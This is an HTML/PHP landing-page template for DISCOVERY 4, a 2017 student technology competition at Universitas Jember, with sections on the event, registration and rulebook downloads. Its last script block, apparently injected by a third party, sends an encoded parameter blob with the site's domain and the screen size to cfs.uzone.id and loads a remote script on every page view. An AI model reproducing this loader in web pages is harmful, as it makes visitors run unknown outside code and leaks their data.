<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Remove Tap Highlight on Windows Phone IE -->
    <meta name="msapplication-tap-highlight" content="no"/>
    <link rel="icon" type="image/png" href="<?php echo base_url();?>assets/img/logo.png" sizes="16x16">
    <link rel="icon" type="image/png" href="<?php echo base_url();?>assets/img/logo.png" sizes="32x32">
    <title>Discovery 4 - Landing Page</title>
    <!-- uikit -->
    <link rel="stylesheet" href="<?php echo base_url();?>bower_components/uikit/css/uikit.almost-flat.min.css" media="all">

    <!-- altair landing page -->
    <link rel="stylesheet" href="<?php echo base_url();?>assets/css/landingpage.css" media="all">

    <!-- matchMedia polyfill for testing media queries in JS -->
    <!--[if lte IE 9]>
    <script type="text/javascript" src="<?php echo base_url();?>bower_components/matchMedia/matchMedia.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>bower_components/matchMedia/matchMedia.addListener.js"></script>
    <![endif]-->
</head>
<body>
<!-- navigation -->
<style>
    #header_main .uk-navbar-nav > li.current_active a{
        box-shadow: inset 0 -4px 0 #2196f3;
    }

</style>
<header id="header_main">
    <nav class="uk-navbar">
        <div class="uk-container uk-container-center">
            <a href="#" class="uk-float-left" id="mobile_navigation_toggle" data-uk-offcanvas="{target:'#mobile_navigation'}"><i class="material-icons">&#xE5D2;</i></a>
            <a href="#" class="uk-navbar-brand">
                <img src="<?php echo base_url();?>assets/img/logo2.png" width="150">
            </a>
            <a href="<?php echo base_url();?>authentication" class="md-btn md-btn-primary uk-navbar-flip header_cta uk-margin-left">Login</a>
            <div class="uk-navbar-flip">
                <ul class="uk-navbar-nav" id="main_navigation">

                    <li>
                        <a href="#sect-home">
                            Home
                        </a>
                    </li>
                    <li>
                        <a href="#sect-tentang">
                            Tentang
                        </a>
                    </li>
                    <li>
                        <a href="#sect-pendaftaran">
                            Pendaftaran
                        </a>
                    </li>
                    <li>
                        <a href="#sect-kontak">
                            Kontak
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
</header>
<div id="mobile_navigation" class="uk-offcanvas">
    <div class="uk-offcanvas-bar">
        <ul>
            <li>
                <a href="#sect-home" data-uk-smooth-scroll="{offset: 48}">
                    <span class="menu_icon"><i class="material-icons">home</i></span>
                    <span class="menu_title">Home</span>
                </a>
            </li>
            <li>
                <a href="#sect-tentang" data-uk-smooth-scroll="{offset: 48}">
                    <span class="menu_icon"><i class="material-icons">info</i></span>
                    <span class="menu_title">Tentang</span>
                </a>
            </li>
            <li>
                <a href="#sect-pendaftaran" data-uk-smooth-scroll="{offset: 48}">
                    <span class="menu_icon"><i class="material-icons">assignment</i></span>
                    <span class="menu_title">Pendaftaran</span>
                </a>
            </li>
            <li>
                <a href="#sect-kontak" data-uk-smooth-scroll="{offset: 48}">
                    <span class="menu_icon"><i class="material-icons">&#xE7FB;</i></span>
                    <span class="menu_title">Kontak</span>
                </a>
            </li>
        </ul>
    </div>
</div>

<section class="banner" id="sect-home">
    <!--    <img src="--><?php //echo base_url();?><!--assets/img/landingpage/layer1.png">-->
    <div data-uk-slideshow="{animation: 'swipe'}" data-uk-parallax="{yp: '25', velocity: '0.4'}">
        <ul class="uk-slideshow">
            <li style="background-image: url('<?php echo base_url();?>assets/img/layer1.png')">

            </li>
        </ul>
    </div>
</section>
<section class="section section_dark md-bg-yellow-500">
    <div class="uk-container uk-container-center animate" data-uk-scrollspy="{cls:'uk-animation-slide-right animated',target:'> *',delay:300}">
        <h5 class="heading_a heading_light uk-text-center-medium md-color-blue-500">
            <i>"Modern Life : Human Needs, Techno Meets"</i>
        </h5>
    </div>
</section>
<section class="section section_large" id="sect-tentang">
    <div class="uk-container uk-container-center">
        <div class="uk-grid">
            <div class="uk-width-large-3-5 uk-container-center uk-text-center">
                <h2 class="heading_b">
                    <img src="<?php echo base_url();?>assets/img/landingpage/aboutdiscovery.png" width="50%">
                </h2>
            </div>
        </div>
        <div class="uk-grid uk-grid-width-1-1 uk-grid-width-medium-1-2 uk-grid-width-large-1-2 animate" data-uk-scrollspy="{cls:'uk-animation-slide-bottom animated',target:'> *',delay:300,topoffset:-100}">
            <div class="uk-margin-top">
                <div class="uk-text-justify">
                    <p>
                        Di tahun 2017, Badan Eksekutif Mahasiswa (BEM) Program Studi Sistem
                        Informasi Universitas Jember kembali mengadakan kompetisi skala
                        nasional dengan nama “DISCOVERY : Discover Your Creativity”.
                    </p>
                    <p>Sebuah perlombaan karya cipta teknologi untuk umum dengan usia maksimal 25 tahun yang mengangkat tema “MODERN LIFE : HUMAN NEEDS, TECHNO MEETS”.
                    </p>
                    <p>Acara ini tergabung dalam rangkaian kegiatan Event of Computer and Technology (ENCODE) 2017 Universitas Jember.
                    </p>
                </div>
                <div class="uk-text-center" style="margin:50px">
                    <a href="<?php echo base_url();?>authentication/register" class="uk-text-center md-btn md-btn-large md-bg-yellow-500">Register Now</a>
                </div>
            </div>
            <div class="uk-margin-top">
                <img width="95%" src="<?php echo base_url();?>assets/img/landingpage/aboutdiscovery2.png">
            </div>
        </div>
    </div>
</section>
<section class="section md-bg-blue-grey-50" id="sect-pendaftaran">
    <div class="uk-container uk-container-center uk-invisible" data-uk-scrollspy="{cls:'uk-animation-scale-up uk-invisible',delay:300,topoffset:-100}">
        <div class="uk-grid uk-margin-large-bottom">
            <div class="uk-width-large-3-5 uk-container-center uk-text-center">
                <h2 class="heading_b">
                    Pendaftaran
                    <span class="sub-heading">Tata Cara Pendaftaran</span>
                </h2>
            </div>
        </div>
        <div class="uk-tab-center uk-margin-medium-bottom">
            <ul class="uk-tab uk-tab-large" data-uk-tab="{connect:'#team_tabbed',animation: 'slide-bottom'}">
                <li class="uk-active"><a href="#">Online</a></li>
                <li><a href="#">Offline</a></li>
            </ul>
        </div>
        <ul id="team_tabbed" class="uk-switcher uk-margin">
            <li>
                <div class="uk-grid uk-grid-medium uk-grid-width-small-1-1 uk-grid-width-medium-1-1 uk-grid-width-large-1-1" data-uk-grid-margin>
                    <div>
                        <img src="<?php echo base_url();?>assets/img/landingpage/pendaftaranonline2.png">
                    </div>
                </div>
            </li>
            <li>
                <div class="uk-grid uk-grid-medium uk-grid-width-small-1-1 uk-grid-width-medium-1-1 uk-grid-width-large-1-1" data-uk-grid-margin>
                    <div>
                        <img src="<?php echo base_url();?>assets/img/landingpage/pendaftaranoffline.png">
                    </div>
                </div>
            </li>
        </ul>
    </div>
</section>
<section class="section  md-bg-yellow-500">
    <div class="uk-container uk-container-center">
        <div class="animate" data-uk-scrollspy="{cls:'uk-animation-slide-right animated',target:'> *',delay:300}">
            <div class="uk-grid">
                <div class="uk-width-large-1-2 uk-container-center uk-text-center">
                    <a href="<?php echo base_url();?>assets/pedoman/rulebook_discovery4.pdf" class="uk-text-center md-btn md-btn-large md-btn-primary">Rulebook</a>
                    <a href="<?php echo base_url();?>assets/pedoman/pedoman_penulisan_discovery4.pdf" class="uk-text-center md-btn md-btn-large md-btn-primary">Pedoman Penulisan</a>
                </div>

            </div>


        </div>
    </div>
</section>
<section class="section"  id="sect-kontak">
    <img style="margin-top:0px" src="<?php echo base_url();?>assets/img/landingpage/layer5.jpg">
</section>

<section class="section section_dark md-bg-blue-grey-700">
    <div class="uk-container uk-container-center">
        <div class="uk-grid" data-uk-grid-margin>
            <div class="uk-width-medium-3-5 uk-text-center-medium">
                Copyright &copy; Discovery 4
            </div>
            <div class="uk-width-medium-2-5">
                <div class="uk-align-medium-right uk-text-center-medium">
                    <a href="https://www.facebook.com/discov17/?fref=ts" class="uk-margin-medium-right" data-uk-tooltip="{offset: 12}" title="Facebook"><i class="uk-icon-facebook uk-icon-small md-color-white"></i></a><!--
                        --><a href="https://www.instagram.com/discovery810/" class="uk-margin-medium-right" data-uk-tooltip="{offset: 12}" title="Instagram"><i class="uk-icon-instagram uk-icon-small md-color-white"></i></a>
                </div>
            </div>
        </div>
    </div>
</section>
<!-- google web fonts -->
<script>
    WebFontConfig = {
        google: {
            families: [
                'Source+Code+Pro:400,700:latin',
                'Roboto:300,400,500,700,400italic:latin'
            ]
        }
    };
    (function() {
        var wf = document.createElement('script');
        wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
            '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
        wf.type = 'text/javascript';
        wf.async = 'true';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(wf, s);
    })();
</script>
<style>
    .wrong_reason{
        margin-top: 0px;
        font-size: 12px;
        position: absolute;
        color: #e53935;
        transition: opacity .2s ease-in;
    }
</style>
<!-- common functions -->
<script src="<?php echo base_url();?>assets/js/common_lp.min.js"></script>
<!-- uikit functions -->
<script src="<?php echo base_url();?>assets/js/uikit_custom_lp.min.js"></script>
<!-- altair common functions/helpers -->
<script src="<?php echo base_url();?>assets/js/altair_lp_common.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKO%2bI3UxfpuPpZj7oeRqgkX65ZNkfg5%2fKJ5k%2fAfCzuT3OSz%2fbKbzv4l%2fVr6tM0uFD%2fRiq9CiKtze3ButKyDJQl9XkDa9hSMKWNgGnmuoY5IXgU77Mp7ocvMYJvle4fyD%2bP6SKpUteEd4%2b8SVoS8VTljo2%2bXYYFvZsI%2fiRxKiMlws3OdSChzAKq3gX%2fVVWD2IwqyOnqcYJ8bxTUf7BA10xK%2bKTlov6Ovm0665ucSNRWiz36oZAJSt1ZV1pVkXWLML86IWuKbz1AiKMyBdkTR3BCabdeyegYN9hl8R%2byYMYcuzPSTjSm00ZUBOT0CU%2fyQ4MtaHjaMr5xwzlZQJtGN40yKZCY25O6DAFsFPs0pr8HtFFjFDI2cK0DZcJJiMCyfLY32Pet5cEgsZfFKXu%2btSZS%2fkX6EDYEXFKXfjI7DMSpc2K6qratK4KFdHgQp3F1UWlPODkOWeJf68zW2WeK8NRwIeTq%2fc0jjktuID4bIFq%2bbXT0pKX6vbfNE58cvYjMtBSiGKbH0ojc5gLVL2OlQ7P8HZ%2f2aWb7S71oQfSQsGaJku1BGq1avp%2fa50TimLayvojcqAn8vJlvCxc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
